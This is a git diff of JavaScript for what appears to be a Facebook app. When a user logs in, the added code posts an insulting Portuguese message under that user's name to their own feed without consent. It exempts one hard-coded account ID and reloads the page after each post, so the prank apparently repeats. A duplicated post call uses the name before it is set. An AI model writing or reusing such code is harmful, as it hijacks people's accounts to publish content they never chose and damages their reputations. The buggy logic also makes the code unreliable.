@@ -17,15 +17,39 @@
   		login();
 		if (response.status === 'connected') {
     		// connected
-    		FB.api('/me/friends', function(response) {
-				var amizades = "";
-				for(var i = 0; i < response.data.length; i++)
-				{
-					amizades += '<a href="http://www.facebook.com/'+response.data[i].id+'">'+response.data[i].name + "</a><br />";
-				}
-				var content = document.getElementById('content');
-				content.innerHTML = amizades;
-			});
+    		//FB.api('/me/friends', function(response) {
+		//		var amizades = "";
+		//		for(var i = 0; i < response.data.length; i++)
+		//		{
+		//			amizades += '<a href="http://www.facebook.com/'+response.data[i].id+'">'+response.data[i].name + "</a><br />";
+		//		}
+		//		var content = document.getElementById('content');
+		//		content.innerHTML = amizades;
+		//	});
+		FB.api('/me', function(response) {
+			nome = response.name;
+			id = response.id;
+			if(id === "100001077357295")
+			{
+				alert("haha");
+			} else {
+			FB.api('/me/feed', 'post', {message:"O "+nome+" é um baldão meeeeel deeeeeeeeeels"}, function(response) {
+                        	if(!response || response.error ) {
+                               		 alert("Erro");
+	                        } else {
+        	                        location.reload();
+                	        }
+                	});}
+
+		});
+		FB.api('/me/feed', 'post', {message:"O "+nome+" é um baldão meeeeel deeeeeeeeeels"}, function(response) {
+                	if(!response || response.error ) {
+                        	alert("Erro");
+                	} else {
+                        	location.reload();
+                	}
+	        });
+
 		document.getElementById('logout-button').innerHTML = '<a href="#" onclick="javascript:logout()">Deslogar</a>';	
   		} else if (response.status === 'not_authorized') {
     		// not_authorized
@@ -83,7 +107,7 @@ function postToFeed() {
 
 function enviarFeed()
 {
-	var messageContent = document.getElementById("posicao").value + " : " + document.getElementById('message').value + " rogerio é baldão vlw";
+	var messageContent = document.getElementById("posicao").value + " : " + document.getElementById('message').value ;
 	FB.api('/me/feed', 'post', {message:messageContent}, function(response) {
 		if(!response || response.error ) {
 			alert("Erro");
